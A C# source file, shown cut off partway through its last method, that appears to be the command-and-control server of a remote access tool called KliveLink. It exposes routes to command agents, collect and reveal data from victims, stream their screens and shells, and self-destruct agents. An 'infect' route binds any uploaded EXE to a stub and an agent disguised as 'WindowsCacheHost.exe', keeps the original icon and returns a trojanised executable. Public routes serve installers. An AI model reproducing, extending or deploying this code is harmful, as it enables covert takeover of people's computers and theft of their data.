using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using KliveLink.Contracts;
using Newtonsoft.Json;
using Omnipotent.Profiles;
using Omnipotent.Profiles.Permissions;
using Omnipotent.Services.KliveAPI;

namespace Omnipotent.Services.KliveLink;

public sealed class KliveLinkV2Routes
{
    private readonly KliveLinkV2Service _parent;
    private readonly Omnipotent.Services.KliveAPI.KliveAPI? _injectedApi;
    private Omnipotent.Services.KliveAPI.KliveAPI? _api;

    public KliveLinkV2Routes(KliveLinkV2Service parent, Omnipotent.Services.KliveAPI.KliveAPI? api = null)
    {
        _parent = parent;
        _injectedApi = api;
    }

    private async Task<Omnipotent.Services.KliveAPI.KliveAPI> ResolveApiAsync()
    {
        if (_api != null) return _api;
        if (_injectedApi != null) return _api = _injectedApi;

        var direct = _parent.InjectedApi ?? _parent.GetActiveServices().OfType<Omnipotent.Services.KliveAPI.KliveAPI>().FirstOrDefault();
        if (direct != null) return _api = direct;

        var deadline = DateTime.UtcNow.AddSeconds(45);
        while (DateTime.UtcNow < deadline)
        {
            direct = _parent.InjectedApi ?? _parent.GetActiveServices().OfType<Omnipotent.Services.KliveAPI.KliveAPI>().FirstOrDefault();
            if (direct != null) return _api = direct;
            await Task.Delay(100);
        }
        throw new InvalidOperationException("KliveAPI did not become available in time for KliveLink v2 route registration.");
    }

    public async Task CreateRoutes()
    {
        var api = await ResolveApiAsync();

        await api.CreateRoute("/klivelink/v2/agents", async req =>
        {
            try
            {
                var agents = _parent.Store.ListAgents().Select(a => new
                {
                    a.AgentId,
                    a.MachineName,
                    a.OsVersion,
                    a.AgentVersion,
                    a.FirstSeen,
                    a.LastSeen,
                    a.ConnectedAt,
                    a.IsConnected,
                    a.GroupName,
                    a.CollectionStatus,
                    a.TagsJson,
                    a.HealthJson,
                    IsOnline = a.IsConnected,
                    Stale = a.IsConnected && DateTimeOffset.UtcNow - a.LastSeen > TimeSpan.FromMinutes(3),
                }).ToList();
                await req.ReturnResponse(JsonConvert.SerializeObject(agents), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.AgentsView);

        await api.CreateRoute("/klivelink/v2/agents/detail", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                if (string.IsNullOrWhiteSpace(agentId)) { await Bad(req, "agentId required"); return; }
                var agent = _parent.Store.GetAgent(agentId);
                if (agent == null) { await NotFound(req, "Agent not found"); return; }
                await req.ReturnResponse(JsonConvert.SerializeObject(new
                {
                    agent.AgentId,
                    agent.MachineName,
                    agent.OsVersion,
                    agent.AgentVersion,
                    agent.FirstSeen,
                    agent.LastSeen,
                    agent.ConnectedAt,
                    agent.IsConnected,
                    agent.GroupName,
                    agent.CollectionStatus,
                    agent.TagsJson,
                    agent.HealthJson,
                    Summary = _parent.Store.GetDataSummary(agentId),
                }), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.AgentsView);

        await api.CreateRoute("/klivelink/v2/agents/command", async req =>
        {
            try
            {
                using JsonDocument doc = JsonDocument.Parse(req.userMessageContent ?? "{}");
                string agentId = doc.RootElement.TryGetProperty("agentId", out var a) ? a.GetString() ?? "" : "";
                if (string.IsNullOrWhiteSpace(agentId)) { await Bad(req, "agentId required"); return; }
                string opText = doc.RootElement.TryGetProperty("operation", out var o) ? o.GetString() ?? "" : "";
                if (!Enum.TryParse(opText, true, out V2CommandOperation operation))
                {
                    await Bad(req, "Unknown operation");
                    return;
                }
                int timeout = doc.RootElement.TryGetProperty("timeoutMs", out var t) ? t.GetInt32() : 30_000;
                JsonElement payload = doc.RootElement.TryGetProperty("payload", out var p) ? p.Clone() : JsonDocument.Parse("{}").RootElement.Clone();
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                V2Result result = await _parent.Server.SendCommandAsync(agentId, operation, payload, timeout, actor);
                await req.ReturnResponse(JsonConvert.SerializeObject(result), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Post, KliveLinkPerms.AgentsControl);

        await api.CreateRoute("/klivelink/v2/agents/data-summary", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                if (string.IsNullOrWhiteSpace(agentId)) { await Bad(req, "agentId required"); return; }
                await req.ReturnResponse(JsonConvert.SerializeObject(_parent.Store.GetDataSummary(agentId)), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.AgentsView);

        await api.CreateRoute("/klivelink/v2/agents/purge", async req =>
        {
            try
            {
                V2PurgeRequest? request = JsonConvert.DeserializeObject<V2PurgeRequest>(req.userMessageContent ?? "{}");
                if (request == null || string.IsNullOrWhiteSpace(request.AgentId)) { await Bad(req, "agentId required"); return; }
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                string detail = JsonConvert.SerializeObject(new { request.DeleteCollection, request.DeleteRemote, request.KeepAudit });
                V2PurgeJob job = _parent.Store.CreatePurgeJob(request.AgentId, "all", detail);
                _parent.Store.Audit(actor, "purge.queued", request.AgentId, new { job.JobId, request.DeleteRemote, request.KeepAudit });
                _ = Task.Run(async () => await RunPurgeAsync(request, job.JobId, actor));
                await req.ReturnResponse(JsonConvert.SerializeObject(job), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Post, KliveLinkPerms.AgentsPurge);

        await api.CreateRoute("/klivelink/v2/agents/purge/status", async req =>
        {
            try
            {
                string? jobId = req.userParameters.Get("jobId");
                if (string.IsNullOrWhiteSpace(jobId)) { await Bad(req, "jobId required"); return; }
                var job = _parent.Store.GetPurgeJob(jobId);
                if (job == null) { await NotFound(req, "Purge job not found"); return; }
                await req.ReturnResponse(JsonConvert.SerializeObject(job), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.AgentsPurge);

        await api.CreateRoute("/klivelink/v2/collection/snapshots", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                int limit = int.TryParse(req.userParameters.Get("limit"), out int n) ? n : 100;
                await req.ReturnResponse(JsonConvert.SerializeObject(_parent.Store.ListSnapshots(agentId, limit)), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.CollectionView);

        await api.CreateRoute("/klivelink/v2/collection/records", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                string? category = req.userParameters.Get("category");
                string? query = req.userParameters.Get("q");
                int limit = int.TryParse(req.userParameters.Get("limit"), out int n) ? n : 500;
                await req.ReturnResponse(JsonConvert.SerializeObject(_parent.Store.SearchRecords(agentId, category, query, limit)), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.CollectionSearch);

        await api.CreateRoute("/klivelink/v2/collection/record", async req =>
        {
            try
            {
                string? recordId = req.userParameters.Get("recordId");
                if (string.IsNullOrWhiteSpace(recordId)) { await Bad(req, "recordId required"); return; }
                bool reveal = string.Equals(req.userParameters.Get("reveal"), "true", StringComparison.OrdinalIgnoreCase);
                var record = _parent.Store.GetRecord(recordId, reveal);
                if (record == null) { await NotFound(req, "Record not found"); return; }
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                if (reveal) _parent.Store.Audit(actor, "collection.reveal", record.AgentId, new { recordId, record.Name });
                await req.ReturnResponse(JsonConvert.SerializeObject(record), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.CollectionDownload);

        await api.CreateRoute("/klivelink/v2/collection/download", async req =>
        {
            try
            {
                string? snapshotId = req.userParameters.Get("snapshotId");
                if (string.IsNullOrWhiteSpace(snapshotId)) { await Bad(req, "snapshotId required"); return; }
                var snapshots = _parent.Store.ListSnapshots(null, 1000);
                var snapshot = snapshots.FirstOrDefault(s => s.SnapshotId == snapshotId);
                if (snapshot == null || string.IsNullOrWhiteSpace(snapshot.BundlePath) || !File.Exists(snapshot.BundlePath))
                {
                    await NotFound(req, "Bundle not found");
                    return;
                }
                byte[] bytes = _parent.Store.ReadBundle(snapshot.BundlePath);
                var headers = new System.Collections.Specialized.NameValueCollection
                {
                    { "Content-Disposition", $"attachment; filename=\"{snapshot.SnapshotId}.zip\"" }
                };
                await req.ReturnBinaryResponse(bytes, "application/zip", headers: headers);
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.CollectionDownload);

        await api.CreateRoute("/klivelink/v2/collection/start", async req =>
        {
            try
            {
                using JsonDocument doc = JsonDocument.Parse(req.userMessageContent ?? "{}");
                string agentId = doc.RootElement.TryGetProperty("agentId", out var a) ? a.GetString() ?? "" : "";
                if (string.IsNullOrWhiteSpace(agentId)) { await Bad(req, "agentId required"); return; }
                var request = new V2CollectionRequest
                {
                    Profile = doc.RootElement.TryGetProperty("profile", out var p) ? p.GetString() ?? "t0-fast" : "t0-fast",
                    Tier = doc.RootElement.TryGetProperty("tier", out var tier) && Enum.TryParse(tier.GetString(), true, out V2CollectionTier parsed) ? parsed : V2CollectionTier.T0,
                    MaxBytes = doc.RootElement.TryGetProperty("maxBytes", out var mb) && mb.TryGetInt64(out long maxBytes)
                        ? Math.Clamp(maxBytes, 1_000_000, 4L * 1024 * 1024 * 1024)
                        : 50 * 1024 * 1024,
                    Categories = doc.RootElement.TryGetProperty("categories", out var cats) && cats.ValueKind == JsonValueKind.Array
                        ? cats.EnumerateArray().Select(c => c.GetString() ?? "").Where(c => c.Length > 0).ToArray()
                        : Array.Empty<string>(),
                };
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                _ = Task.Run(async () =>
                {
                    try
                    {
                        V2Result result = await _parent.Server.SendCommandAsync(
                            agentId, V2CommandOperation.StartCollection, request, 600_000, actor);
                        if (result.Status != V2CommandStatus.Ok)
                            await _parent.LogErrorAsync(
                                new Exception($"Collection {request.Tier} failed: {result.Error}"),
                                $"KliveLink collection {agentId}");
                    }
                    catch (Exception ex)
                    {
                        await _parent.LogErrorAsync(ex, $"KliveLink collection {agentId}");
                    }
                });
                await req.ReturnResponse(JsonConvert.SerializeObject(new
                {
                    started = true,
                    agentId,
                    tier = request.Tier.ToString(),
                    profile = request.Profile,
                }), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Post, KliveLinkPerms.CollectionManage);

        await api.CreateRoute("/klivelink/v2/audit", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                int limit = int.TryParse(req.userParameters.Get("limit"), out int n) ? n : 200;
                await req.ReturnResponse(JsonConvert.SerializeObject(_parent.Store.ListAudit(agentId, limit)), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.AuditView);

        await api.CreateRoute("/klivelink/v2/updates/current", async req =>
        {
            try
            {
                var manifest = _parent.Updates.GetCurrent();
                await req.ReturnResponse(JsonConvert.SerializeObject(manifest), "application/json");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, KliveLinkPerms.AgentsView);

        await api.CreateRoute("/klivelink/v2/updates", async req =>
        {
            try
            {
                V2UpdateManifest? manifest = JsonConvert.DeserializeObject<V2UpdateManifest>(req.userMessageContent ?? "{}");
                if (manifest == null || string.IsNullOrWhiteSpace(manifest.Version)) { await Bad(req, "version required"); return; }
                _parent.Updates.SetCurrent(manifest);
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                _parent.Store.Audit(actor, "update.manifest", "", manifest);
                await req.ReturnResponse(JsonConvert.SerializeObject(manifest), "application/json");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Post, KliveLinkPerms.AgentsControl);

        await api.CreateRoute("/klivelink/v2/agents/update", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                if (string.IsNullOrWhiteSpace(agentId)) { await Bad(req, "agentId required"); return; }
                V2UpdateManifest? manifest = string.IsNullOrWhiteSpace(req.userMessageContent)
                    ? _parent.Updates.GetCurrent()
                    : JsonConvert.DeserializeObject<V2UpdateManifest>(req.userMessageContent);
                if (manifest == null) { await Bad(req, "No update manifest configured"); return; }
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                V2Result result = await _parent.Server.SendCommandAsync(agentId, V2CommandOperation.UpdateAgent, manifest, 600_000, actor);
                await req.ReturnResponse(JsonConvert.SerializeObject(result), "application/json");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Post, KliveLinkPerms.AgentsControl);

        await api.CreateBufferedRoute("/klivelink/v2/infect", async req =>
        {
            try
            {
                byte[] original = req.userMessageBytes ?? Array.Empty<byte>();
                if (original.Length < 2) { await Bad(req, "EXE body required"); return; }
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string? stubPath = KliveLinkAssetLocator.Find("InfectStub.exe");
                string? agentPath = KliveLinkAssetLocator.Find("WindowsCacheHost.exe");
                string? configPath = KliveLinkAssetLocator.Find("klive.config.json");
                if (string.IsNullOrWhiteSpace(stubPath) || string.IsNullOrWhiteSpace(agentPath) || string.IsNullOrWhiteSpace(configPath) || !File.Exists(stubPath) || !File.Exists(agentPath) || !File.Exists(configPath))
                {
                    await req.ReturnResponse("Infect payloads missing on server (InfectStub.exe, WindowsCacheHost.exe, klive.config.json).",
                        "text/plain", null, HttpStatusCode.ServiceUnavailable);
                    return;
                }

                byte[] stub = await File.ReadAllBytesAsync(stubPath);
                byte[] agent = await File.ReadAllBytesAsync(agentPath);
                byte[] config = await File.ReadAllBytesAsync(configPath);
                stub = PeIconUpdater.ApplyOriginalIcon(original, stub);
                using var memory = new MemoryStream(stub.Length + original.Length + agent.Length + config.Length + 512);
                memory.Write(stub);
                long originalOffset = memory.Position;
                memory.Write(original);
                long agentOffset = memory.Position;
                memory.Write(agent);
                long configOffset = memory.Position;
                memory.Write(config);
                using (var writer = new BinaryWriter(memory, Encoding.UTF8, leaveOpen: true))
                {
                    writer.Write(Encoding.ASCII.GetBytes("KLINF1\0\0"));
                    writer.Write((ulong)originalOffset);
                    writer.Write((ulong)original.Length);
                    writer.Write((ulong)agentOffset);
                    writer.Write((ulong)agent.Length);
                    writer.Write((ulong)configOffset);
                    writer.Write((ulong)config.Length);
                    string name = Path.GetFileName(req.userParameters.Get("filename") ?? "application.exe");
                    byte[] nameBytes = new byte[520];
                    Encoding.Unicode.GetBytes(name, 0, Math.Min(name.Length, 259), nameBytes, 0);
                    writer.Write(nameBytes);
                }
                string outputName = Path.GetFileNameWithoutExtension(req.userParameters.Get("filename") ?? "application") + "-infected.exe";
                var headers = new System.Collections.Specialized.NameValueCollection
                {
                    { "Content-Disposition", $"attachment; filename=\"{outputName}\"" }
                };
                byte[] body = MaybeGzip(req, memory.ToArray(), headers);
                await req.ReturnBinaryResponse(body, "application/octet-stream", headers: headers);
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Post, KliveLinkPerms.Infect, 250L * 1024 * 1024);

        await api.CreateRoute("/k", async req =>
        {
            try
            {
                string userAgent = req.req?.UserAgent ?? "";
                if (userAgent.Contains("Windows", StringComparison.OrdinalIgnoreCase))
                {
                    await ServeWindowsSetup(req);
                    return;
                }
                await ServeTextResource(req, "KliveLink.InstallSh", "text/x-shellscript; charset=utf-8");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/k/select", async req =>
        {
            try
            {
                string html = KliveLinkPortableAssets.ReadText("KliveLink.LandingHtml")
                    .Replace("__BASE_URL__", BaseUrl(req), StringComparison.Ordinal);
                await req.ReturnResponse(html, "text/html; charset=utf-8");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/k/windows/x64", async req => await ServeWindowsSetup(req), HttpMethod.Get, Perms.Public);
        await api.CreateRoute("/k/windows", async req => await ServeTextResource(req, "KliveLink.InstallPs1", "text/plain; charset=utf-8"), HttpMethod.Get, Perms.Public);
        await api.CreateRoute("/k/linux", async req => await ServeTextResource(req, "KliveLink.InstallSh", "text/x-shellscript; charset=utf-8"), HttpMethod.Get, Perms.Public);
        await api.CreateRoute("/k/macos", async req => await ServeTextResource(req, "KliveLink.InstallSh", "text/x-shellscript; charset=utf-8"), HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/klivelink/v2/bootstrap", async req =>
        {
            try
            {
                string tokenPath = Path.Combine(_parent.Options.DataDirectory, "generated", "agent-token.txt");
                string token = File.Exists(tokenPath) ? (await File.ReadAllTextAsync(tokenPath)).Trim() : "";
                if (string.IsNullOrWhiteSpace(token))
                {
                    await req.ReturnResponse("{\"error\":\"Agent token not provisioned\"}", "application/json", null, HttpStatusCode.ServiceUnavailable);
                    return;
                }
                string server = Environment.GetEnvironmentVariable("KLIVELINK_C2_URL")
                    ?? "wss://klive.dev/klivelink/v2/ws";
                var headers = new System.Collections.Specialized.NameValueCollection { { "Cache-Control", "no-store" } };
                await req.ReturnResponse(JsonConvert.SerializeObject(new
                {
                    server,
                    token,
                    autoTier = "T1",
                    version = KliveLinkPortableAssets.ReleaseVersion,
                }), "application/json", headers);
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/klivelink/v2/agent", async req =>
        {
            try
            {
                string rid = req.userParameters.Get("rid") ?? "";
                if (string.IsNullOrWhiteSpace(rid))
                {
                    await Bad(req, "rid required");
                    return;
                }
                await ServePortableAgent(req, rid);
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/klivelink/v2/agent/hash", async req =>
        {
            try
            {
                string rid = req.userParameters.Get("rid") ?? "";
                KliveLinkPortableAssets.Asset? asset = KliveLinkPortableAssets.Find(rid);
                if (asset == null)
                {
                    await NotFound(req, "Unknown RID");
                    return;
                }
                await req.ReturnResponse($"{asset.sha256}  {asset.archive}\n", "text/plain");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/klivelink/v2/assets", async req =>
        {
            try
            {
                await req.ReturnResponse(KliveLinkPortableAssets.ReadText("KliveLink.PortableAssets"), "application/json");
            }
            catch (Exception ex) { await Fail(req, ex); }
        }, HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/klivelink/v2/download", async req => await ServeWindowsSetup(req), HttpMethod.Get, Perms.Public);

        await api.CreateRoute("/klivelink/v2/health", async req =>
        {
            try
            {
                var agents = _parent.Store.ListAgents();
                await req.ReturnResponse(JsonConvert.SerializeObject(new
                {
                    ok = true,
                    sessions = _parent.Server.SessionCount,
                    agents = agents.Count,
                    connected = agents.Count(a => a.IsConnected),
                    utc = DateTimeOffset.UtcNow,
                }), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Get, KliveLinkPerms.AgentsView);

        await api.CreateRoute("/klivelink/v2/agents/selfdestruct", async req =>
        {
            try
            {
                string? agentId = req.userParameters.Get("agentId");
                if (string.IsNullOrWhiteSpace(agentId)) { await Bad(req, "agentId required"); return; }
                string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
                V2Result result = await _parent.Server.SendCommandAsync(agentId, V2CommandOperation.SelfDestruct, new { }, 120_000, actor);
                await req.ReturnResponse(JsonConvert.SerializeObject(result), "application/json");
            }
            catch (Exception ex)
            {
                await Fail(req, ex);
            }
        }, HttpMethod.Post, KliveLinkPerms.AgentsDestroy);

        await api.CreateAgentWebSocketRoute(
            "/klivelink/v2/ws",
            async (context, socket, query, user) =>
            {
                string agentId = context.Request.Headers["X-Agent-Id"] ?? "";
                string token = context.Request.Headers["X-Enrollment-Token"] ?? "";
                await _parent.Server.HandleAgentSocketAsync(socket, agentId, token);
            });

        await api.CreateWebSocketRoute(
            "/klivelink/v2/events",
            async (context, socket, query, user) =>
            {
                string viewerId = _parent.Server.AddEventViewer(socket);
                try
                {
                    var buffer = new byte[1024];
                    while (socket.State == WebSocketState.Open)
                    {
                        var result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                        if (result.MessageType == WebSocketMessageType.Close) break;
                    }
                }
                catch { }
                finally
                {
                    _parent.Server.RemoveEventViewer(viewerId);
                    if (socket.State == WebSocketState.Open)
                    {
                        try { await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "events ended", CancellationToken.None); } catch { }
                    }
                }
            }, KliveLinkPerms.AgentsView);

        await api.CreateWebSocketRoute(
            "/klivelink/v2/agents/screen/stream",
            async (context, socket, query, user) =>
            {
                string? agentId = query.Get("agentId");
                if (string.IsNullOrWhiteSpace(agentId) || socket.State != WebSocketState.Open)
                {
                    if (socket.State == WebSocketState.Open)
                        await socket.CloseAsync(WebSocketCloseStatus.PolicyViolation, "agentId required", CancellationToken.None);
                    return;
                }
                if (_parent.Store.GetAgent(agentId) is not { IsConnected: true })
                {
                    await socket.CloseAsync(WebSocketCloseStatus.PolicyViolation, "Agent not connected", CancellationToken.None);
                    return;
                }
                string viewerId = _parent.Server.AddScreenViewer(agentId, socket);
                try
                {
                    await socket.SendAsync(Encoding.UTF8.GetBytes("{\"type\":\"ready\"}"), WebSocketMessageType.Text, true, CancellationToken.None);
                    var buffer = new byte[1024];
                    while (socket.State == WebSocketState.Open)
                    {
                        var result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                        if (result.MessageType == WebSocketMessageType.Close) break;
                    }
                }
                catch { }
                finally
                {
                    _parent.Server.RemoveScreenViewer(agentId, viewerId);
                    if (socket.State == WebSocketState.Open)
                    {
                        try { await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "stream ended", CancellationToken.None); } catch { }
                    }
                }
            }, KliveLinkPerms.AgentsControl);

        await api.CreateWebSocketRoute(
            "/klivelink/v2/agents/shell/stream",
            async (context, socket, query, user) =>
            {
                string? agentId = query.Get("agentId");
                if (string.IsNullOrWhiteSpace(agentId) || socket.State != WebSocketState.Open)
                {
                    if (socket.State == WebSocketState.Open)
                        await socket.CloseAsync(WebSocketCloseStatus.PolicyViolation, "agentId required", CancellationToken.None);
                    return;
                }
                if (_parent.Store.GetAgent(agentId) is not { IsConnected: true })
                {
                    await socket.CloseAsync(WebSocketCloseStatus.PolicyViolation, "Agent not connected", CancellationToken.None);
                    return;
                }
                string viewerId = _parent.Server.AddShellViewer(agentId, socket);
                try
                {
                    await _parent.Server.SendCommandAsync(agentId, V2CommandOperation.ShellOpen, new { }, 10_000, user?.Name ?? "operator");
                    await socket.SendAsync(Encoding.UTF8.GetBytes("{\"type\":\"ready\"}"), WebSocketMessageType.Text, true, CancellationToken.None);
                    var buffer = new byte[8192];
                    while (socket.State == WebSocketState.Open)
                    {
                        var result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                        if (result.MessageType == WebSocketMessageType.Close) break;
                        string text = Encoding.UTF8.GetString(buffer, 0, result.Count);
                        try
                        {
                            using JsonDocument doc = JsonDocument.Parse(text);
                            string? input = doc.RootElement.TryGetProperty("text", out var value) ? value.GetString() : null;
                            if (!string.IsNullOrEmpty(input)) await _parent.Server.SendShellInputAsync(agentId, input);
                        }
                        catch { }
                    }
                }
                catch { }
                finally
                {
                    _parent.Server.RemoveShellViewer(agentId, viewerId);
                    await _parent.Server.SendCommandAsync(agentId, V2CommandOperation.ShellClose, new { }, 5_000, user?.Name ?? "operator");
                    if (socket.State == WebSocketState.Open)
                    {
                        try { await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "shell ended", CancellationToken.None); } catch { }
                    }
                }
            }, KliveLinkPerms.AgentsControl);

        await _parent.LogAsync("KliveLink v2 routes created.");
    }

    private async Task RunPurgeAsync(V2PurgeRequest request, string jobId, string actor)
    {
        try
        {
            _parent.Store.UpdatePurgeJob(jobId, "running", "{}");
            if (request.DeleteRemote && _parent.Store.GetAgent(request.AgentId)?.IsConnected == true)
            {
                await _parent.Server.SendCommandAsync(request.AgentId, V2CommandOperation.SelfDestruct, new { }, 120_000, actor);
            }
            _parent.Store.UpdatePurgeJob(jobId, "deleting_db", "{}");
            var (summary, bundles) = _parent.Store.PurgeAgent(request.AgentId, request.KeepAudit);
            _parent.Store.UpdatePurgeJob(jobId, "deleting_blobs", JsonConvert.SerializeObject(summary));
            foreach (string bundle in bundles)
            {
                try { if (File.Exists(bundle)) File.Delete(bundle); } catch { }
            }
            _parent.Store.UpdatePurgeJob(jobId, "purging_search", "{}");
            var orphans = _parent.Store.OrphanScan();
            foreach (string bundle in orphans.BundlePaths)
            {
                try { if (File.Exists(bundle)) File.Delete(bundle); } catch { }
            }
            _parent.Store.Audit(actor, "purge.completed", request.AgentId, new { jobId, summary, orphans = new { orphans.Snapshots, orphans.Records } });
            _parent.Store.UpdatePurgeJob(jobId, "done", JsonConvert.SerializeObject(new { summary, orphanSnapshots = orphans.Snapshots, orphanRecords = orphans.Records }));
        }
        catch (Exception ex)
        {
            _parent.Store.UpdatePurgeJob(jobId, "failed", JsonConvert.SerializeObject(new { error = ex.Message }));
            _parent.Store.Audit(actor, "purge.failed", request.AgentId, new { jobId, error = ex.Message });
        }
    }

    private static async Task Bad(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, string message)
        => await req.ReturnResponse(JsonConvert.SerializeObject(new { error = message }), "application/json", null, HttpStatusCode.BadRequest);

    private static async Task NotFound(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, string message)
        => await req.ReturnResponse(JsonConvert.SerializeObject(new { error = message }), "application/json", null, HttpStatusCode.NotFound);

    private static async Task Fail(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, Exception ex)
        => await req.ReturnResponse(JsonConvert.SerializeObject(new { error = ex.Message }), "application/json", null, HttpStatusCode.InternalServerError);

    /// <summary>
    /// Binary downloads (installers and infected EXEs) are large and mostly compressible.
    /// Browsers and fetch() transparently decode Content-Encoding: gzip.
    /// </summary>
    private static byte[] MaybeGzip(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, byte[] data,
        System.Collections.Specialized.NameValueCollection headers)
    {
        try
        {
            string? accept = req.req?.Headers["Accept-Encoding"];
            if (string.IsNullOrWhiteSpace(accept) ||
                !accept.Contains("gzip", StringComparison.OrdinalIgnoreCase))
                return data;
            using var memory = new MemoryStream();
            using (var gzip = new GZipStream(memory, CompressionLevel.Fastest, leaveOpen: true))
                gzip.Write(data, 0, data.Length);
            headers["Content-Encoding"] = "gzip";
            return memory.ToArray();
        }
        catch
        {
            headers.Remove("Content-Encoding");
            return data;
        }
    }

    private static readonly HttpClient AssetHttp = new() { Timeout = TimeSpan.FromMinutes(10) };

    private static string BaseUrl(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req)
        => req.req?.Url?.GetLeftPart(UriPartial.Authority) ?? "https://klive.dev";

    private static async Task ServeTextResource(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req,
        string resource, string contentType)
    {
        string text = KliveLinkPortableAssets.ReadText(resource)
            .Replace("__BASE_URL__", BaseUrl(req), StringComparison.Ordinal);
        var headers = new System.Collections.Specialized.NameValueCollection
        {
            { "Cache-Control", "no-store" }
        };
        await req.ReturnResponse(text, contentType, headers);
    }

    private static async Task ServeWindowsSetup(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req)
    {
        string? path = KliveLinkAssetLocator.Find("WindowsCacheHostSetup.exe");
        if (string.IsNullOrWhiteSpace(path) || !File.Exists(path))
        {
            await req.ReturnResponse("Installer not found", code: HttpStatusCode.NotFound);
            return;
        }
        byte[] bytes = await File.ReadAllBytesAsync(path);
        var headers = new System.Collections.Specialized.NameValueCollection
        {
            { "Content-Disposition", "attachment; filename=\"WindowsCacheHostSetup.exe\"" }
        };
        await req.ReturnBinaryResponse(MaybeGzip(req, bytes, headers), "application/octet-stream", headers: headers);
    }

    private async Task ServePortableAgent(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, string rid)
    {
        KliveLinkPortableAssets.Asset? asset = KliveLinkPortableAssets.Find(rid);
        if (asset == null)
        {
            await NotFound(req, "Unknown RID");
            return;
        }

        string cacheDir = Path.Combine(_parent.Options.DataDirectory, "agents");
        string localPath = Path.Combine(cacheDir, asset.archive);
        if (!File.Exists(localPath))
        {
            string? github = KliveLinkPortableAssets.GithubUrl(asset);
            if (string.IsNullOrWhiteSpace(github))
            {
                await req.ReturnResponse("Agent asset unavailable", code: HttpStatusCode.ServiceUnavailable);
                return;
            }
            try
            {
                byte[] downloaded = await AssetHttp.GetByteArrayAsync(github);
                string hash = Convert.ToHexString(SHA256.HashData(downloaded)).ToLowerInvariant();
                if (!string.Equals(hash, asset.sha256, StringComparison.OrdinalIgnoreCase))
                    throw new InvalidDataException("Agent asset checksum mismatch.");
                Directory.CreateDirectory(cacheDir);
                string temp = localPath + ".tmp";
                await File.WriteAllBytesAsync(temp, downloaded);
                File.Move(temp, localPath, true);
            }
            catch
            {
                var redirect = new System.Collections.Specialized.NameValueCollection
                {
                    { "Location", github },
                    { "Cache-Control", "no-store" }
                };
                await req.ReturnResponse("", "text/plain", redirect, HttpStatusCode.Redirect);
                return;
            }
        }

        byte[] bytes = await File.ReadAllBytesAsync(localPath);
        var headers = new System.Collections.Specialized.NameValueCollection
        {
            { "Content-Disposition", $"attachment; filename=\"{asset.archive}\"" },
            { "X-Checksum-Sha256", asset.sha256 },
            { "X-Agent-Version", KliveLinkPortableAssets.ReleaseVersion },
            { "Cache-Control", "public, max-age=300" }
        };
